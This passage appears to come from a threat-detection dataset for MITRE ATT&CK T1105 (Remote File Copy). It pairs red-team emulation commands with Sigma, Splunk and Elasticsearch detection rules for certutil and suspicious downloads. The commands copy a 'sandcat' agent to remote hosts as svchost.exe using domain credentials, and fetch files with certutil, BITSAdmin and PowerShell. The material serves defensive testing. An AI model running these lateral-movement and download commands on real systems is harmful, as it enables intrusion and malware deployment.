"payload": "sandcat.go-windows"}, "cmd": {"cleanup": "erase \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe /Q /F &\nnet use \\\\#{remote.host.ip}\\c$ /delete\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &\ncopy /B /Y sandcat.go-windows \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe\n", "payload": "sandcat.go-windows"}}}], "technique_id": "T1105", "parsed_datasets": [{"Atomic Red Team Test - Remote File Copy": {"display_name": "Remote File Copy", "atomic_tests": [{"description": "Utilize rsync to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "name": "rsync remote file copy (push)", "input_arguments": {"username": {"default": "victim", "type": "String", "description": "User account to authenticate on remote host"}, "local_path": {"default": "/tmp/adversary-rsync/", "type": "Path", "description": "Path of folder to copy"}, "remote_host": {"default": "victim-host", "type": "String", "description": "Remote host to copy toward"}, "remote_path": {"default": "/tmp/victim-files", "type": "Path", "description": "Remote path to receive rsync"}}, "executor": {"command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n", "name": "bash"}}, {"description": "Utilize rsync to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "name": "rsync remote file copy (pull)", "input_arguments": {"username": {"default": "adversary", "type": "String", "description": "User account to authenticate on remote host"}, "local_path": {"default": "/tmp/victim-files", "type": "Path", "description": "Local path to receive rsync"}, "remote_host": {"default": "adversary-host", "type": "String", "description": "Remote host to copy from"}, "remote_path": {"default": "/tmp/adversary-rsync/", "type": "Path", "description": "Path of folder to copy"}}, "executor": {"command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "name": "bash"}}, {"description": "Utilize scp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "name": "scp remote file copy (push)", "input_arguments": {"username": {"default": "victim", "type": "String", "description": "User account to authenticate on remote host"}, "local_file": {"default": "/tmp/adversary-scp", "type": "Path", "description": "Path of file to copy"}, "remote_host": {"default": "victim-host", "type": "String", "description": "Remote host to copy toward"}, "remote_path": {"default": "/tmp/victim-files/", "type": "Path", "description": "Remote path to receive scp"}}, "executor": {"command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n", "name": "bash"}}, {"description": "Utilize scp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "name": "scp remote file copy (pull)", "input_arguments": {"username": {"default": "adversary", "type": "String", "description": "User account to authenticate on remote host"}, "remote_file": {"default": "/tmp/adversary-scp", "type": "Path", "description": "Path of file to copy"}, "local_path": {"default": "/tmp/victim-files/", "type": "Path", "description": "Local path to receive scp"}, "remote_host": {"default": "adversary-host", "type": "String", "description": "Remote host to copy from"}}, "executor": {"command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "name": "bash"}}, {"description": "Utilize sftp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "name": "sftp remote file copy (push)", "input_arguments": {"username": {"default": "victim", "type": "String", "description": "User account to authenticate on remote host"}, "local_file": {"default": "/tmp/adversary-sftp", "type": "Path", "description": "Path of file to copy"}, "remote_host": {"default": "victim-host", "type": "String", "description": "Remote host to copy toward"}, "remote_path": {"default": "/tmp/victim-files/", "type": "Path", "description": "Remote path to receive sftp"}}, "executor": {"command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "name": "bash"}}, {"description": "Utilize sftp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "name": "sftp remote file copy (pull)", "input_arguments": {"username": {"default": "adversary", "type": "String", "description": "User account to authenticate on remote host"}, "remote_file": {"default": "/tmp/adversary-sftp", "type": "Path", "description": "Path of file to copy"}, "local_path": {"default": "/tmp/victim-files/", "type": "Path", "description": "Local path to receive sftp"}, "remote_host": {"default": "adversary-host", "type": "String", "description": "Remote host to copy from"}}, "executor": {"command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "name": "bash"}}, {"description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n", "supported_platforms": ["windows"], "name": "certutil download (urlcache)", "input_arguments": {"local_path": {"default": "Atomic-license.txt", "type": "Path", "description": "Local path to place file"}, "remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "type": "Url", "description": "URL of file to copy"}}, "executor": {"elevation_required": false, "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "name": "command_prompt"}}, {"description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n", "supported_platforms": ["windows"], "name": "certutil download (verifyctl)", "input_arguments": {"local_path": {"default": "Atomic-license.txt", "type": "Path", "description": "Local path to place file"}, "remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "type": "Url", "description": "URL of file to copy"}}, "executor": {"elevation_required": false, "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "name": "powershell"}}, {"description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n", "supported_platforms": ["windows"], "name": "Windows - BITSAdmin BITS Download", "input_arguments": {"bits_job_name": {"default": "qcxjb7", "type": "String", "description": "Name of the created BITS job"}, "local_path": {"default": "Atomic-license.txt", "type": "Path", "description": "Local path to place file"}, "remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "type": "Url", "description": "URL of file to copy"}}, "executor": {"command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n", "name": "command_prompt"}}, {"description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n", "supported_platforms": ["windows"], "name": "Windows - PowerShell Download", "input_arguments": {"destination_path": {"default": "$env:TEMP\\Atomic-license.txt", "type": "Path", "description": "Destination path to file"}, "remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "type": "Url", "description": "URL of file to copy"}}, "executor": {"command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "name": "powershell", "cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n"}}, {"description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n", "supported_platforms": ["windows"], "name": "OSTAP Worming Activity", "input_arguments": {"destination_path": {"default": "\\\\localhost\\C$", "type": "String", "description": "Path to create remote file at. Default is local admin share."}}, "executor": {"elevation_required": true, "command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "name": "command_prompt"}}], "attack_technique": "T1105"}}, {"Mitre Stockpile - Create a text file for the user to find": {"platforms": {"windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}, "darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}}, "description": "Create a text file for the user to find", "tactic": "command-and-control", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "name": "Leave note"}}, {"Mitre Stockpile - Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP": {"platforms": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Copy-Item -Path \"sandcat.go-windows\" -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payload": "sandcat.go-windows"}}, "darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~\n", "payload": "sandcat.go"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'\n", "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&\n", "payload": "sandcat.go"}}}, "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "name": "Copy 54ndc47 (WinRM and SCP)"}}, {"Mitre Stockpile - Copy 54ndc47 to remote host (SMB)": {"platforms": {"windows": {"psh": {"cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "payload": "sandcat.go-windows", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}], "description": "Copy 54ndc47 to remote host (SMB)", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "id": "65048ec1-f7ca-49d3-9410-10813e472b30", "name": "Copy 54ndc47 (SMB)"}}, {"Mitre Stockpile - Copy 54ndc47 to remote host (SMB)": {"platforms": {"windows": {"psh": {"cleanup": "$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nRemove-Item -Path $drive\":\\Users\\Public\\svchost.exe\" -Force;\nRemove-PSDrive -Name $drive;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$path = $env:USERPROFILE+\"\\sandcat.go-windows\";\n$drive = \"#{remote.host.ip}\".replace(\".\",\"_\");\nNew-PSDrive -Name $drive -PSProvider FileSystem -Root \"\\\\#{remote.host.ip}\\C$\" -Credential $cred;\nCopy-Item -Path $path -Destination $drive\":\\Users\\Public\\svchost.exe\";\n", "payload": "sandcat.go-windows"}, "cmd": {"cleanup": "erase \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe /Q /F &\nnet use \\\\#{remote.host.ip}\\c$ /delete\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &\ncopy /B /Y sandcat.go-windows \\\\#{remote.host.ip}\\c$\\Users\\Pubic\\svchost.exe\n", "payload": "sandcat.go-windows"}}}, "description": "Copy 54ndc47 to remote host (SMB)", "tactic": "lateral-movement", "technique": {"attack_id": "T1105", "name": "Remote File Copy"}, "id": "c5e75d70-09ae-469f-8717-621a1b7ef946", "name": "Copy 54ndc47 (SMB)"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2027267", "Verified": "Yes", "Signature": "ET ATTACK\\_RESPONSE Possible Lateral Movement - File Creation Request in Remote System32 Directory"}}], "queries": [{"query": "title: Microsoft Binary Github Communication\nid: 635dbb88-67b3-4b41-9ea5-a3af2dd88153\nstatus: experimental\ndescription: Detects an executable in the Windows folder accessing github.com\nreferences:\n    - https://twitter.com/M_haggis/status/900741347035889665\n    - https://twitter.com/M_haggis/status/1032799638213066752\nauthor: Michael Haag (idea), Florian Roth (rule)\ntags:\n    - attack.lateral_movement\n    - attack.t1105\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationHostname: \n            - '*.github.com'\n            - '*.githubusercontent.com'\n        Image: 'C:\\Windows\\\\*'\n    condition: selection\nfalsepositives:\n    - 'Unknown'\n    - '@subTee in your network'\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Microsoft Binary Github Communication\nid: 635dbb88-67b3-4b41-9ea5-a3af2dd88153\nstatus: experimental\ndescription: Detects an executable in the Windows folder accessing github.com\nreferences:\n    - https://twitter.com/M_haggis/status/900741347035889665\n    - https://twitter.com/M_haggis/status/1032799638213066752\nauthor: Michael Haag (idea), Florian Roth (rule)\ntags:\n    - attack.lateral_movement\n    - attack.t1105\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationHostname: \n            - '*.github.com'\n            - '*.githubusercontent.com'\n        Image: 'C:\\Windows\\\\*'\n    condition: selection\nfalsepositives:\n    - 'Unknown'\n    - '@subTee in your network'\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"3\" AND Initiated:\"true\" AND DestinationHostname.keyword:(*.github.com OR *.githubusercontent.com) AND Image.keyword:C\\\\:\\\\\\\\Windows\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Microsoft-Binary-Github-Communication <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Microsoft Binary Github Communication\",\\n    \"description\": \"Detects an executable in the Windows folder accessing github.com\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1105\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationHostname.keyword:(*.github.com OR *.githubusercontent.com) AND Image.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationHostname.keyword:(*.github.com OR *.githubusercontent.com) AND Image.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Microsoft Binary Github Communication\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"3\" AND Initiated:\"true\" AND DestinationHostname.keyword:(*.github.com *.githubusercontent.com) AND Image.keyword:C\\\\:\\\\\\\\Windows\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"3\" Initiated=\"true\" (DestinationHostname=\"*.github.com\" OR DestinationHostname=\"*.githubusercontent.com\") Image=\"C:\\\\\\\\Windows\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"3\" Initiated=\"true\" DestinationHostname IN [\"*.github.com\", \"*.githubusercontent.com\"] Image=\"C:\\\\\\\\Windows\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*3)(?=.*true)(?=.*(?:.*.*\\\\.github\\\\.com|.*.*\\\\.githubusercontent\\\\.com))(?=.*C:\\\\Windows\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Microsoft Binary Suspicious Communication Endpoint\nid: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97\nstatus: experimental\ndescription: Detects an executable in the Windows folder accessing suspicious domains\nreferences:\n    - https://twitter.com/M_haggis/status/900741347035889665\n    - https://twitter.com/M_haggis/status/1032799638213066752\nauthor: Florian Roth\ndate: 2018/08/30\ntags:\n    - attack.lateral_movement\n    - attack.t1105\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationHostname: \n            - '*dl.dropboxusercontent.com'\n            - '*.pastebin.com'\n            - '*.githubusercontent.com' # includes both gists and github repositories\n        Image: 'C:\\Windows\\\\*'\n    condition: selection\nfalsepositives:\n    - 'Unknown'\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Microsoft Binary Suspicious Communication Endpoint\nid: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97\nstatus: experimental\ndescription: Detects an executable in the Windows folder accessing suspicious domains\nreferences:\n    - https://twitter.com/M_haggis/status/900741347035889665\n    - https://twitter.com/M_haggis/status/1032799638213066752\nauthor: Florian Roth\ndate: 2018/08/30\ntags:\n    - attack.lateral_movement\n    - attack.t1105\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationHostname: \n            - '*dl.dropboxusercontent.com'\n            - '*.pastebin.com'\n            - '*.githubusercontent.com' # includes both gists and github repositories\n        Image: 'C:\\Windows\\\\*'\n    condition: selection\nfalsepositives:\n    - 'Unknown'\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"3\" AND Initiated:\"true\" AND DestinationHostname.keyword:(*dl.dropboxusercontent.com OR *.pastebin.com OR *.githubusercontent.com) AND Image.keyword:C\\\\:\\\\\\\\Windows\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Microsoft-Binary-Suspicious-Communication-Endpoint <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Microsoft Binary Suspicious Communication Endpoint\",\\n    \"description\": \"Detects an executable in the Windows folder accessing suspicious domains\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1105\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationHostname.keyword:(*dl.dropboxusercontent.com OR *.pastebin.com OR *.githubusercontent.com) AND Image.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationHostname.keyword:(*dl.dropboxusercontent.com OR *.pastebin.com OR *.githubusercontent.com) AND Image.keyword:C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Microsoft Binary Suspicious Communication Endpoint\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"3\" AND Initiated:\"true\" AND DestinationHostname.keyword:(*dl.dropboxusercontent.com *.pastebin.com *.githubusercontent.com) AND Image.keyword:C\\\\:\\\\\\\\Windows\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"3\" Initiated=\"true\" (DestinationHostname=\"*dl.dropboxusercontent.com\" OR DestinationHostname=\"*.pastebin.com\" OR DestinationHostname=\"*.githubusercontent.com\") Image=\"C:\\\\\\\\Windows\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"3\" Initiated=\"true\" DestinationHostname IN [\"*dl.dropboxusercontent.com\", \"*.pastebin.com\", \"*.githubusercontent.com\"] Image=\"C:\\\\\\\\Windows\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*3)(?=.*true)(?=.*(?:.*.*dl\\\\.dropboxusercontent\\\\.com|.*.*\\\\.pastebin\\\\.com|.*.*\\\\.githubusercontent\\\\.com))(?=.*C:\\\\Windows\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Certutil Command\nid: e011a729-98a6-4139-b5c4-bf6f6dd8239a\nstatus: experimental\ndescription: Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with\n    the built-in certutil utility\nauthor: Florian Roth, juju4, keepwatch\nmodified: 2019/01/22\nreferences:\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://twitter.com/subTee/status/888102593838362624\n    - https://twitter.com/subTee/status/888071631528235010\n    - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/\n    - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -decode *'\n            - '* /decode *'\n            - '* -decodehex *'\n            - '* /decodehex *'\n            - '* -urlcache *'\n            - '* /urlcache *'\n            - '* -verifyctl *'\n            - '* /verifyctl *'\n            - '* -encode *'\n            - '* /encode *'\n            - '*certutil* -URL*'\n            - '*certutil* /URL*'\n            - '*certutil* -ping*'\n            - '*certutil* /ping*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.t1140\n    - attack.t1105\n    - attack.s0189\n    - attack.g0007\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Certutil Command\nid: e011a729-98a6-4139-b5c4-bf6f6dd8239a\nstatus: experimental\ndescription: Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with\n    the built-in certutil utility\nauthor: Florian Roth, juju4, keepwatch\nmodified: 2019/01/22\nreferences:\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://twitter.com/subTee/status/888102593838362624\n    - https://twitter.com/subTee/status/888071631528235010\n    - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/\n    - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/\n    - https://twitter.com/egre55/status/1087685529016193025\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -decode *'\n            - '* /decode *'\n            - '* -decodehex *'\n            - '* /decodehex *'\n            - '* -urlcache *'\n            - '* /urlcache *'\n            - '* -verifyctl *'\n            - '* /verifyctl *'\n            - '* -encode *'\n            - '* /encode *'\n            - '*certutil* -URL*'\n            - '*certutil* /URL*'\n            - '*certutil* -ping*'\n            - '*certutil* /ping*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.t1140\n    - attack.t1105\n    - attack.s0189\n    - attack.g0007\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-decode\\\\ * OR *\\\\ \\\\/decode\\\\ * OR *\\\\ \\\\-decodehex\\\\ * OR *\\\\ \\\\/decodehex\\\\ * OR *\\\\ \\\\-urlcache\\\\ * OR *\\\\ \\\\/urlcache\\\\ * OR *\\\\ \\\\-verifyctl\\\\ * OR *\\\\ \\\\/verifyctl\\\\ * OR *\\\\ \\\\-encode\\\\ * OR *\\\\ \\\\/encode\\\\ * OR *certutil*\\\\ \\\\-URL* OR *certutil*\\\\ \\\\/URL* OR *certutil*\\\\ \\\\-ping* OR *certutil*\\\\ \\\\/ping*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Certutil-Command <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Certutil Command\",\\n    \"description\": \"Detects a suspicious Microsoft certutil execution with sub commands like \\'decode\\' sub command, which is sometimes used to decode malicious code with the built-in certutil utility\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1140\",\\n      \"attack.t1105\",\\n      \"attack.s0189\",\\n      \"attack.g0007\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-decodehex\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/decodehex\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-urlcache\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/urlcache\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-verifyctl\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/verifyctl\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/encode\\\\\\\\ * OR *certutil*\\\\\\\\ \\\\\\\\-URL* OR *certutil*\\\\\\\\ \\\\\\\\/URL* OR *certutil*\\\\\\\\ \\\\\\\\-ping* OR *certutil*\\\\\\\\ \\\\\\\\/ping*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-decodehex\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/decodehex\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-urlcache\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/urlcache\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-verifyctl\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/verifyctl\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-encode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\/encode\\\\\\\\ * OR *certutil*\\\\\\\\ \\\\\\\\-URL* OR *certutil*\\\\\\\\ \\\\\\\\/URL* OR *certutil*\\\\\\\\ \\\\\\\\-ping* OR *certutil*\\\\\\\\ \\\\\\\\/ping*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                